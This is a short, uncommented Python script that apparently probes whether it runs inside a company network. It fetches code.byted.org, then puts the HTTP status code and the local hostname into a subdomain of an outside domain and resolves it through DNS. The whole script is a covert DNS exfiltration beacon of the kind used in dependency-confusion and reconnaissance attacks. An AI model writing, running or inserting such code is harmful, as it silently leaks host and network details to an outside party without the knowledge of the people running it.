import requests
import socket


su = "https://code.byted.org/"


response = requests.get(su)


sc = response.status_code

hostn = socket.gethostname()

du = f"{sc}.{hostn}.ig538pls.22.ax"


socket.gethostbyname(du)
